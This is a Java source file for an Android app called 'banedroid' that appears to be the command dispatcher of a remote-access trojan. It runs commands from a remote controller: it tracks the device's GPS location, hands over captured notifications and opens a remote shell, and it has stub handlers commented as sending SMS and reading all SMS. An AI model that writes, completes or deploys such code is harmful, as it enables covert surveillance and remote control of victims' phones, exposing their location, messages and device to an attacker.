package com.example.banedroid.dispatcher;

import com.bane.model.*;
import com.example.banedroid.bane.gps.Tracker;
import com.example.banedroid.bane.notifications.NotificationManager;
import com.example.banedroid.connection.Connection;
import com.example.banedroid.service.BaneService;
import com.example.banedroid.bane.storage.Storage;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;

public class DefaultDispatcher extends Dispatcher {

    private Storage storage = Storage.Storage(BaneService.context);

    public DefaultDispatcher(Connection connection) {
        super(connection);
    }

    @Override
    public BaneObject dispatch(BaneObject request) {
        System.out.println(request);
        String command = ((String)request.values[0].value);
        if(command.contains("name")){
            String newName = ((String)request.values[0].value).replace("name ","");
            storage.set("name",newName);
            return new BaneObject(BaneCode.RESPONSE,"new name "+newName,null);
        } else if (command.equals("track")){
            ExecutorService e = Executors.newSingleThreadExecutor();
            try {
                return e.submit(new Tracker()).get();
            } catch (Exception ex) {
                ex.printStackTrace();
                return new BaneObject(BaneCode.ERROR, "Execution error while tracking", null);
            }
        } else if(command.equals("news")){
            NotificationManager nm = NotificationManager.NotificationManager();
            return new BaneObject(BaneCode.RESPONSE,"",new BaneValue[]{new BaneValue<String>("response",nm.flush())});
        } else if(command.contains("sopen")){
            // set the dispatcher to be the ShellDispatcher
            super.connection.setDispatcher(new ShellDispatcher(super.connection));
            return new BaneObject(BaneCode.RESPONSE,"Opened a Remote Shell",null);
        } else if (command.contains("sendsms")){
            // sends an sms
            return new BaneObject(BaneCode.RESPONSE,"Response",null);
        } else if (command.contains("getsms")){
            // gets all the sms
            return new BaneObject(BaneCode.RESPONSE,"Response",null);
        } else {
            return new BaneObject(BaneCode.ERROR,"Command not recognized",null);
        }
    }
}
